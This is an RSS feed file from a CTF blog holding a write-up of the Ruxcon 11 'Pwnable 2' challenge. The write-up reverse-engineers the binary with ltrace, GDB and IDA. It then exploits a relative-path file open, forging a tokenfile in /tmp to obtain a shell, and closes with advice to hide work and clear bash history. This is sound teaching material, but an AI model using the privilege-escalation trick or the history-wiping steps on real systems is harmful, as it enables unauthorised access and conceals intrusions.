@@ -1,0 +1,278 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Dangerpwn</title>
+    <link>http://ctfs.and.coffee/index.xml</link>
+    <description>Recent content on Dangerpwn</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 30 May 2016 20:30:43 +1000</lastBuildDate>
+    <atom:link href="http://ctfs.and.coffee/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Ruxcon 11 — Pwnable 2</title>
+      <link>http://ctfs.and.coffee/post/ruxcon/</link>
+      <pubDate>Mon, 30 May 2016 20:30:43 +1000</pubDate>
+      
+      <guid>http://ctfs.and.coffee/post/ruxcon/</guid>
+      <description>&lt;p&gt;This was the second pwnable challenge at Ruxcon 11. Players would SSH into a server running 64 bit Ubuntu and the SSH user&amp;rsquo;s home directory contained two files: level2 and tokenfile. &lt;code&gt;file&lt;/code&gt; and &lt;code&gt;cat&lt;/code&gt; quickly revealed that &lt;code&gt;level2&lt;/code&gt; is a x86-64 ELF executable that hasn&amp;rsquo;t been stripped. &lt;code&gt;tokenfile&lt;/code&gt; is a text file but we can&amp;rsquo;t read it. Presumably then the aim of the challenge is to read that file!&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  pwnable2  file level2
+level2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e98e13b917a49c072e0ba9035947d21ba91a706d, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When we run &lt;code&gt;level2&lt;/code&gt; it requests a keyfile specified as a path or the character &amp;ldquo;-&amp;rdquo; which specifies &amp;ldquo;give me the keyfile on stdin&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;Before doing anything, run strings over the binary. It&amp;rsquo;ll help you get the lay of the land, and in some (silly) cases, you&amp;rsquo;ll find the flag. Strings doesn&amp;rsquo;t yield the flag but it does reveal some interesting strings that sound like function names:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  pwnable2  strings level2
+&amp;lt;snip&amp;gt;
+parse_header
+no_keys
+&amp;lt;snip&amp;gt;
+auth_scheme
+sizetype
+key_for_scheme
+token_from_file
+XorDecode
+try_authenticate
+&amp;lt;snip&amp;gt;
+mod_table
+encoding_table
+base64_encode
+base64_decode
+build_decoding_table
+base64_cleanup
+input_length
+output_length
+encoded_data
+&amp;lt;snip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like there&amp;rsquo;s authentication attempts, parsing, base64, decoding, etc.&lt;/p&gt;
+
+&lt;p&gt;We&amp;rsquo;ll start simple though; because we&amp;rsquo;re mad hax0rz, we&amp;rsquo;ll initially assume that the password is password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  pwnable2  ./level2 - beans
+Usage: ./level2 &amp;lt;keyfile&amp;gt; or - for stdin
+
+➜  pwnable2  ./level2 -
+password
+Invalid Scheme specified.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;FOILED! The password wasn&amp;rsquo;t password. Undeterred, we&amp;rsquo;ll try running ltrace to look for interesting function calls.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  pwnable2  ltrace ./level2 -
+__libc_start_main(0x400c00, 2, 0x7ffc819d44d8, 0x4017b0 &amp;lt;unfinished ...&amp;gt;
+strcmp(&amp;quot;-&amp;quot;, &amp;quot;-&amp;quot;)                                                    = 0
+malloc(1032)                                                        = 0x16bd010
+__isoc99_fscanf(0x7f4c18f5c4e0, 0x401834, 0x16bd010, 0x16bd018 password
+)     = 0
+malloc(0)                                                           = 0x16bd420
+malloc(4104)                                                        = 0x16bd440
+strcmp(&amp;quot;&amp;quot;, &amp;quot;XOR&amp;quot;)                                                   = -88
+strcmp(&amp;quot;&amp;quot;, &amp;quot;NOENCRYPT&amp;quot;)                                             = -78
+fprintf(0x7f4c18f5c060, &amp;quot;Invalid Scheme specified.\n&amp;quot;Invalid Scheme specified.
+)              = 26
++++ exited (status 1) +++
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Notice the calls to &lt;code&gt;strcmp(&amp;quot;&amp;quot;, &amp;quot;XOR&amp;quot;)&lt;/code&gt; and &lt;code&gt;strcmp(&amp;quot;&amp;quot;, &amp;quot;NOENCRYPT&amp;quot;)&lt;/code&gt;, followed by the call that prints &lt;em&gt;&amp;ldquo;Invalid Scheme specified&amp;rdquo;&lt;/em&gt;. Looks like our input will need to pass a comparison with either &amp;ldquo;XOR&amp;rdquo; or &amp;ldquo;NOENCRYPT&amp;rdquo; (or both!) While that sounds like a good start, notice that our ninja input guess of &amp;ldquo;password&amp;rdquo; doesn&amp;rsquo;t appear in either of those comparisons! hmmm &amp;hellip; it looks like our input is being read in via fscanf so let&amp;rsquo;s break out GDB and find out what&amp;rsquo;s going on.&lt;/p&gt;
+
+&lt;p&gt;Note that I&amp;rsquo;m using the superduper awesome Python Exploit Development Assistant (&lt;a href=&#34;https://github.com/longld/peda&#34;&gt;&lt;code&gt;peda.py&lt;/code&gt;&lt;/a&gt;) for GDB, it makes GDB not suck in the way that &lt;a href=&#34;http://theoatmeal.com/pl/minor_differences/cereal&#34;&gt;milk makes cereal not suck&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Here, we run &lt;code&gt;gdb level2&lt;/code&gt;, set a breakpoint for the &lt;code&gt;__isoc99_fscanf&lt;/code&gt; function and set up the program arguments to accept input from stdin.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ctfs.and.coffee/images/rux11_pwn2_gdb_fscanf.png&#34; alt=&#34;gdb&#34; /&gt;
+Whenever GDB breaks, PEDA prints a dump of the processor state (no more spamming &lt;code&gt;i r&lt;/code&gt;!) at the top we have a register dump, followed by disassembly around the current program counter and a memory dump. It looks like rsi contains the format string being passed to fscanf, that&amp;rsquo;s going to determine what gets read in. The manual for fscanf should contain everything we need to interpret the format string.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;SCANF(3)                                  Linux Programmer&#39;s Manual                                 SCANF(3)
+
+
+
+NAME
+       scanf, fscanf, sscanf, vscanf, vsscanf, vfscanf - input format conversion
+
+SYNOPSIS
+       #include &amp;lt;stdio.h&amp;gt;
+
+       int scanf(const char *format, ...);
+       int fscanf(FILE *stream, const char *format, ...);
+
+&amp;lt;snip&amp;gt;
+
+The conversion specifications in format are of two forms, either beginning with &#39;%&#39; 
+or beginning with &amp;quot;%n$&amp;quot;.   The two forms should not be mixed in the same format 
+string, except that a string containing &amp;quot;%n$&amp;quot; specifications can include %% and %*.  
+If format contains &#39;%&#39; specifications, then these correspond  in  order  with 
+successive  pointer  arguments.   In  the  &amp;quot;%n$&amp;quot;  form (which is specified in       
+POSIX.1-2001, but not C99), n is a decimal integer that specifies that the converted 
+input should  be placed in the location referred to by the n-th pointer argument 
+following format.
+
+   Conversions
+
+       l      Indicates  either  that  the  conversion  will  be  one of d, i, o, u, 
+       x, X, or n and the next pointer is a pointer to a long int or unsigned long 
+       int (rather than int), or that the conversion  will  be  one  of  e,  f,  or g
+       and the next pointer is a pointer to double (rather than float).  Specifying 
+       two l characters is equivalent to L.  If used with %c or  %s,  the  
+       corresponding  parameter  is  considered  as a pointer to a wide character or
+       wide-character string respectively.
+
+       u      Matches an unsigned decimal integer; the next pointer must be a pointer
+       to unsigned int.
+
+       s      Matches  a sequence of non-white-space characters; the next pointer 
+       must be a pointer to character array that is long enough to hold the input  
+       sequence  and  the  terminating  null  byte (&#39;\0&#39;), which is added 
+       automatically.  The input string stops at white space or at the maximum
+       field width, whichever occurs first.
+
+&amp;lt;snip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The fscanf format string, &lt;code&gt;&amp;quot;%lu:%1023s&amp;quot;&lt;/code&gt;,  can be broken down into the following:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;%lu&lt;/code&gt; - unsigned long&lt;/li&gt;
+&lt;li&gt;: - ASCII character &amp;ldquo;:&amp;rdquo;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%1023s&lt;/code&gt; - 1023 character string (1024 with the null terminator).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Before, we just passed in the string &amp;ldquo;password&amp;rdquo; and our input didn&amp;rsquo;t make it to the &lt;code&gt;strcmp&lt;/code&gt; instructions. Let&amp;rsquo;s adjust the format to match the fscanf format string and try again. To make things neater, we&amp;rsquo;ll also put our input in a keyfile rather than entering it via stdin.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  pwnable2  echo &amp;quot;123:password&amp;quot; &amp;gt; key1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Changing the format seems to have worked! We now see the string &amp;ldquo;password&amp;rdquo; being compared against &amp;ldquo;XOR&amp;rdquo; and &amp;ldquo;NOENCRYPT&amp;rdquo;, but we still hit the &amp;ldquo;Invalid Scheme specified&amp;rdquo; message. If we change our input to &amp;ldquo;123:NOENCRYPT&amp;rdquo; we see the following: &lt;code&gt;strcmp(&amp;quot;NOENCRYPT&amp;quot;, &amp;quot;NOENCRYPT&amp;quot;)&lt;/code&gt;, looks good!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  pwnable2  ltrace ./level2 ./key1
+__libc_start_main(0x400c00, 2, 0x7ffe6b0f31e8, 0x4017b0 &amp;lt;unfinished ...&amp;gt;
+strcmp(&amp;quot;./key1&amp;quot;, &amp;quot;-&amp;quot;)                                               = 1
+fopen(&amp;quot;./key1&amp;quot;, &amp;quot;r&amp;quot;)                                                = 0x2072010
+malloc(1032)                                                        = 0x2072250
+__isoc99_fscanf(0x2072010, 0x401834, 0x2072250, 0x2072258)          = 2
+malloc(629760)                                                      = 0x7f2d3cf19010
+malloc(4104)                                                        = 0x2072660
+strcmp(&amp;quot;password&amp;quot;, &amp;quot;XOR&amp;quot;)                                           = 24
+strcmp(&amp;quot;password&amp;quot;, &amp;quot;NOENCRYPT&amp;quot;)                                     = 34
+fprintf(0x7f2d3cdba060, &amp;quot;Invalid Scheme specified.\n&amp;quot;Invalid Scheme specified.
+)              = 26
++++ exited (status 1) +++
+
+➜  pwnable2  echo &amp;quot;123:NOENCRYPT&amp;quot; &amp;gt; key2
+
+➜  pwnable2  ltrace ./level2 ./key2
+__libc_start_main(0x400c00, 2, 0x7ffc0232d358, 0x4017b0 &amp;lt;unfinished ...&amp;gt;
+strcmp(&amp;quot;./key2&amp;quot;, &amp;quot;-&amp;quot;)                                               = 1
+fopen(&amp;quot;./key2&amp;quot;, &amp;quot;r&amp;quot;)                                                = 0xc43010
+malloc(1032)                                                        = 0xc43250
+__isoc99_fscanf(0xc43010, 0x401834, 0xc43250, 0xc43258)             = 2
+malloc(629760)                                                      = 0x7efc1ddcd010
+malloc(4104)                                                        = 0xc43660
+strcmp(&amp;quot;NOENCRYPT&amp;quot;, &amp;quot;XOR&amp;quot;)                                          = -10
+strcmp(&amp;quot;NOENCRYPT&amp;quot;, &amp;quot;NOENCRYPT&amp;quot;)                                    = 0
+strcpy(0xc43668, &amp;quot;No Encryption&amp;quot;)                                   = 0xc43668
+__isoc99_fscanf(0xc43010, 0x401962, 0x7efc1ddcd010, 0x7efc1ddcd010) = 0xffffffff
+fprintf(0x7efc1dc6e060, &amp;quot;In.correct number of entries. Exp&amp;quot;..., 123, 0Incorrect number of entries. Expected 123 but found 0
+) = 54
++++ exited (status 1) +++
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we&amp;rsquo;re getting the message: &amp;ldquo;Incorrect number of entries. Expected 123 but found 0&amp;rdquo;. Looks like that number we pass in is some kind of counter. Apparently our keyfile contains zero entries, let&amp;rsquo;s try adding stuff to the keyfile. Adding the line &amp;ldquo;password&amp;rdquo; changes the message to &amp;ldquo;Incorrect number of entries. Expected 123 but found 1&amp;rdquo;, looks like the number we pass in is a counter for the number of lines in the keyfile.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  pwnable2  echo &amp;quot;0:NOENCRYPT\npassword&amp;quot; &amp;gt; key3
+
+➜  pwnable2  ./level2 ./key3
+Incorrect number of entries. Expected 123 but found 1
+
+➜  pwnable2  echo &amp;quot;1:NOENCRYPT\npassword&amp;quot; &amp;gt; key3
+
+➜  pwnable2  ./level2 ./key3
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome! Sort of &amp;hellip; nothing actually happens and we clearly haven&amp;rsquo;t pwned anything, nor is it raining shellz. Let&amp;rsquo;s break out IDA to work out how we&amp;rsquo;re actually going to break this thing.&lt;/p&gt;
+
+&lt;p&gt;Once the binary is loaded and disassembled, jump into the strings window (&lt;code&gt;SHIFT+F12&lt;/code&gt;). We&amp;rsquo;re assuming that we want to properly authenticate with the binary so let&amp;rsquo;s trace where the following string is used: &amp;ldquo;Congratulations. You&amp;rsquo;re authenticated!&amp;rdquo; Double click the string, this will jump to a table in the .rodata section, use &lt;code&gt;Ctrl+x&lt;/code&gt; to find cross-references to the string, there&amp;rsquo;s only one in this instance.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ctfs.and.coffee/images/rux11_pwn2_ida_strings.png&#34; alt=&#34;IDA strings window&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So if we authenticate correctly, we get a shell. It sure looks like we&amp;rsquo;re in the right place. But we can&amp;rsquo;t read the token file! If we can&amp;rsquo;t read the token file it&amp;rsquo;s going to be real difficult to construct a valid keyfile.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ctfs.and.coffee/images/rux11_pwn2_ida_congrats.png&#34; alt=&#34;IDA authentication function&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we drill down into the &lt;code&gt;token_from_file&lt;/code&gt; function we find the following interesting code block. There it is! It looks like the program is opening the tokenfile from a relative path rather than an absolute one. We can totally abuse this!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ctfs.and.coffee/images/rux11_pwn2_tokenfile_open.png&#34; alt=&#34;IDA open tokenfile&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I forgot to take screenshots during the actual competition but permissions on the tokenfile were such that the user running the level2 binary wasn&amp;rsquo;t able to read the tokenfile, but they &lt;strong&gt;did&lt;/strong&gt; allow us to move the binary. Because the tokenfile is being opened from &lt;code&gt;./tokenfile&lt;/code&gt;, if we move the binary to somewhere like &lt;code&gt;/tmp&lt;/code&gt; and create our own token file, we should be able to authenticate successfully. Let&amp;rsquo;s test that theory!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  /tmp  echo -n &amp;quot;1:NOENCRYPT\nwinning&amp;quot; &amp;gt; key5
+➜  /tmp  echo -n &amp;quot;winning&amp;quot; &amp;gt; tokenfile
+➜  /tmp  ./level2 ./key5
+Key entry too large.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like we&amp;rsquo;ve missed something. Let&amp;rsquo;s find the message &amp;ldquo;Key entry too large&amp;rdquo; in IDA.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ctfs.and.coffee/images/rux11_pwn2_ida_base64.png&#34; alt=&#34;IDA base64_decode&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If the comparison fails and the branch isn&amp;rsquo;t taken the program prints &amp;ldquo;Key entry too large&amp;rdquo; and exits. This comparison seems to be comparing a variable to -1 directly after a base64 decode operation. Following the flow in IDA, there are 3 paths from this point. Either the program prints &amp;ldquo;Key entry too large&amp;rdquo;, &amp;ldquo;Incorrectly encoded entry&amp;rdquo; or it proceeds to the &lt;code&gt;try_authenticate&lt;/code&gt; function. If we break in GDB at the point where &lt;code&gt;base64_decode&lt;/code&gt; is called we see a pointer (0x602660) to our keyfile entry, &amp;ldquo;winning&amp;rdquo;, being passed as an argument.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://ctfs.and.coffee/images/rux11_pwn2_gdb_base64.png&#34; alt=&#34;GDB base64_decode&#34; /&gt;
+Decoding &amp;ldquo;winning&amp;rdquo; as base64 will clearly fail so perhaps we need to encode our input. Also note that because the binary isn&amp;rsquo;t stripped, we can see the name of the original source file at the point where GDB breaks: &lt;code&gt;authenticate_with_keyfile_b64dec.c&lt;/code&gt;. Sounds good, let&amp;rsquo;s try it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  /tmp  echo &amp;quot;1:NOENCRYPT&amp;quot; &amp;gt; key6
+➜  /tmp  echo -n &amp;quot;winning&amp;quot; | base64 &amp;gt;&amp;gt; key6
+➜  /tmp  ./level2 ./key6
+# 
+
+# cd /home/level2
+
+# ls
+level2	tokenfile
+
+# cat tokenfile
+RUX{not_the_actual_flag_but_you_still_win}
+
+# exit
+Congratulations. You&#39;re authenticated                                                           
+➜  /tmp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;BOOM, we get a shell, change back to the challenge directory and we can read the tokenfile which contains the original flag (I&amp;rsquo;m afraid I don&amp;rsquo;t remember the actual flag).&lt;/p&gt;
+
+&lt;p&gt;We didn&amp;rsquo;t explore the XOR function but evidentially we didn&amp;rsquo;t need it to solve the challenge. Perhaps as the subject of a follow-up post.&lt;/p&gt;
+
+&lt;p&gt;As a final note, this challenge was hosted on a server accessible by all teams. That means that anyone watching the bash history can see what you&amp;rsquo;re doing, making it a delicate operation to solve the challenge without revealing your methods. As a minimum, I&amp;rsquo;d recommend creating a hidden folder, working from there, then deleting the bash history.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  pwnable2  mkdir /.fd788743c5e54c528a6088c650cf8a9d
+➜  pwnable2  cp level2 /.fd788743c5e54c528a6088c650cf8a9d
+
+&amp;lt;pwn all the things&amp;gt;
+
+➜  pwnable2  history -c
+➜  pwnable2  cat /dev/null &amp;gt; ~/.bash_history
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You know &amp;hellip; just to be sure.&lt;/p&gt;
+
+&lt;p&gt;Happy hunting.&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>About</title>
+      <link>http://ctfs.and.coffee/about/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>http://ctfs.and.coffee/about/</guid>
+      <description>&lt;p&gt;Stuff about things goes here.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
